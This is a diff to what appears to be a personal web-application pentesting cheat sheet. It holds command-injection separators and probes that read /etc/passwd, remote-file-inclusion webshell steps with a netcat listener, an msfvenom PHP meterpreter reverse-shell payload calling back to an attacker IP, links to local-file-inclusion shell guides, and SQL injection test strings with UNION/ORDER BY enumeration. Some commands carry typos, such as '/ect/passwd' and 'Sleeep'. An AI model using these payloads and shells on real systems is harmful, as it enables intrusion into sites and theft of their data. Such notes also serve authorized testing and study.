@@ -8,7 +8,7 @@ order: 4
 
 Prefixs before attack payload (command seperator): | <code> &, &&, ||,  <, >, ;, $() </code>
 Test Visable: | <code> ; ls /ect/passwd or /ect/hosts </code>
-Test Blind Ping: | <code> ; ping y.o.ur.ip <br> on your attack system "sudo tcpdump -n host [victimIP] and icmp" </code>
+Test Blind Ping: | <code> ; ping y.o.ur.ip <br> <br> On your attack system: <br> sudo tcpdump -n host [victimIP] and icmp </code>
 Test Blind DNS: | <code> nslookup (you need a public facing system to see nslookup)</code>
 
 
@@ -47,14 +47,15 @@ CGI scripts:
 Auto-Extension Bypass:
 * NULL "%00"
 
->**Shell from RFI**
+>**Shell from RFI and LFI**
 
+RFI Shell 1:
 1. VI a webshell (https://binaryexile.github.io/6%20-%20Web%20Application/Vulnerabilities/)
 2. python -m SimpleHTTPServer 8080
 3. Set up netcat listener (if needed based on webshell)
 3. Navigate to shell (http://www.victim.com/index.php?page=http://127.0.0.1:4321/shellcommand.txt)
 
-Meterpreter:
+RFI Meterpreter Shell:
 1. Create Payload: msfvenom LPORT=1234 LHOST=192.168.1.8 -p php/meterpreter_reverse_tcp -f raw > ~/met_rev_tcp_1234.txt
 2. Wrap it: add <?php ?> to the payload
 3.  Set up handler: 
@@ -66,17 +67,49 @@ exploit
 4.  python -m SimpleHTTPServer 8080
 5. Navigate to shell (http://www.victim.com/index.php?page=http://127.0.0.1:4321/shellcommand.txt)
 
-> **SQL Injection: Test Strings**
+LFI Shell:
+*[LFI Shell 1](http://resources.infosecinstitute.com/local-file-inclusion-code-execution/)
+*[LFI Shell 2](https://highon.coffee/blog/lfi-cheat-sheet/)
 
+> **SQL Injection: Test Location and Strings**
+
+Locations:
+* GET URL query parameters
+* POST parameters
+* Cookie (session information)
+* User-Agent
+
+Visable Test Strings:
 {% highlight bash %}
 ' ` " ; /* --
 {% endhighlight %}
+
+Blind Test Strings:
+*Try the following to see if it provides valid results for text that was interpreted:*
+
+Commenting out the end | <code> Dent' ;# <br> Dent' ;-- </code>
+Inline Commenting | <code> De'/* */'nt </code>
+Concatenation | <code> De' 'nt <br> De'| |'nt </code>
+Binary/Boolean | <code> Dent' and 1;# <br> Dent' and 1=1;# <br> Dent' and 0;# <br> Dent' and 1=0;# </code>
+Sleep | <code> Sleeep(10) MySQL <br>  WAITFOR DELAY '0:0:10'  MSSQL
 
 > **SQL Injection: Database Identification**
 
 Oracle | ORA-01756: quoted string not properly terminated
 MS SQL Server | Incorrect syntax near 'something'
 PostgreSQL | 5-digit Hex Error Code
+
+> **SQL Injection Union**
+
+1. Once you have identified SQL injection, use order by (increase until it breaks):
+{% highlight sql %}
+dent' and 'a'='a' ORDER BY 5; #
+{% endhighlight %}
+2. See which numbers appear in the output, and select one for the union. *Note: It requires the same number of columns and compatable data type*
+{% highlight sql %}
+Dent' UNION SELECT  '1', '2', '3', '4'; #
+{% endhighlight %}
+3.  
 
 > **CSRF**
 
